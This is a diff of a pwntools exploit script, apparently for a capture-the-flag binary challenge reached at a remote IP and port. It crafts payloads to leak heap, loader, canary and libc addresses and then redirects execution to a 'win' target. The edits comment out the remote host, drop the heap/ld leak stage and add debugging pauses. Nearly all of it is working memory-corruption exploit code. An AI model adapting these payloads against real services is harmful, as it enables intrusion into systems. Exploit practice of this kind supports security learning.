@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
 from pwn import *
-
+from pack import *
 context.terminal = ["foot", "-e", "sh", "-c"]
 
 exe = ELF('main_patched', checksec=False)
@@ -35,80 +35,10 @@ def GDB():
 
 #  nc 67.223.119.69 3637 
 if args.REMOTE:
-    p = remote('67.223.119.69', 3637)
-    # p = remote('0', 1338)
+    # p = remote('67.223.119.69', 3637)
+    p = remote('0', 1338)
 else:
     p = process([exe.path])
-
-# pad to make a free chunk --> leak heap base
-load = flat(
-    p32(0x100), # choice in main
-    # arr[0]
-    p8(0x0),
-    0xcafebabe,
-    # arr[1]
-    # p8(3),
-    # b'evilsad.',
-    p8(0x2),
-    p32(0),
-    b'evil is here'
-
-)
-sa(b'> ', load)
-
-# save heap base into admin_str
-
-load = flat(
-    p32(0x1337), # choice in main
-    # arr[0]
-    p8(0x0),
-    0xcafebabe,
-   # arr[1]
-    p8(0x2),
-    p32(0),
-)
-sa(b'> ', load)
-
-# heap leak
-
-load = flat(
-    p32(0x700), # choice in main
-)
-
-sa(b'> ', load)
-ru(b'admin: ')
-
-heap_base = u32(r(2).ljust(4, b'\0')) << 12
-info(f'heap base: {hex(heap_base)}')
-
-
-load = flat(
-    p32(0x1337), # choice in main
-    # arr[0]
-    p8(0x0),
-    0x20,
-    p8(0x2),
-    p32(0x1aa8),
-    b's'*(0x1aa8),
-)
-# admin_str: 0x7fffffffab70
-sa(b'> ', load)
-
-
-load = flat(
-    p32(0x700), # choice in main
-)
-info(f'start leak ld')
-sa(b'> ', load)
-
-a = p.recvuntil(b'No data available !', drop=True)
-info(f'---------------------------------------------------------')
-print(a)
-ld_leak = u64(a[len(a)-8:len(a)-2] + b'\0\0')
-ld.address = ld_leak - 0x9da5
-
-info(f'ld leak: {hex(ld_leak)}')
-info(f'ld base: {hex(ld.address)}')
 
 # control size of 0xdead option
 load = flat(
@@ -117,10 +47,11 @@ load = flat(
     p8(0x0),
     0x29,
     p8(0x2),
-    p32(0x2fe0),
-    b'\0'*(0x2fe0),
+    p32(0x10),
+    b'\0'*(0x10),
 )
 sa(b'> ', load)
+input()
 
 # control IDX_3
 load = flat(
@@ -134,6 +65,7 @@ load = flat(
 )
 
 sa(b'> ', load)
+input('2')
 
 # admin_str: 0x7fffffffab70
 # rip 0x7fffffffdb88
@@ -141,7 +73,8 @@ sa(b'> ', load)
 canary: 0x7fffffffdb78
 """
 # 0x49
-sa(b'> ', load)
+
+
 
 load = flat(
     p32(0xdead), # choice in main
@@ -151,12 +84,16 @@ load = flat(
     b'f'*0x60
 )
 sa(b'> ', load)
+input("next")
 
 load = flat(
     p32(0x700), # choice in main
 )
 info(f'start leak canary')
 sa(b'> ', load)
+input("cabnary")
+
+
 
 a = p.recvuntil(b'No data available !', drop=True)
 info(f'---------------------------------------------------------')
@@ -175,6 +112,8 @@ load = flat(
     b'\0'*(0x36),
 )
 sa(b'> ', load)
+input("set up")
+
 
 
 load = flat(
@@ -188,6 +127,8 @@ load = flat(
 )
 
 sa(b'> ', load)
+input("3")
+
 
 # leak libc
 load = flat(
@@ -198,14 +139,17 @@ load = flat(
     b'f'*0x60
 )
 sa(b'> ', load)
+input("?")
+
 
 load = flat(
     p32(0x700), # choice in main
 )
+
+sa(b'> ', load)
+input("libc")
 info(f'-'*0x10)
 info(f'leak libc')
-sa(b'> ', load)
-
 a = p.recvuntil(b'No data available !', drop=True)
 info(f'---------------------------------------------------------')
 print(a)
@@ -226,6 +170,8 @@ load = flat(
     b'\0'*(0x2fe0),
 )
 sa(b'> ', load)
+input("win?")
+
 
 # control IDX_3
 load = flat(
@@ -239,6 +185,8 @@ load = flat(
 )
 
 sa(b'> ', load)
+
+
 
 # admin_str: 0x7fffffffab70
 # rip 0x7fffffffdb88
@@ -270,6 +218,8 @@ load = flat(
     win.ljust(0x100-0x28, b'k')
 )
 sa(b'> ', load)
+
+
 sa(b'> ', b'1')
 
 # 0x9da5
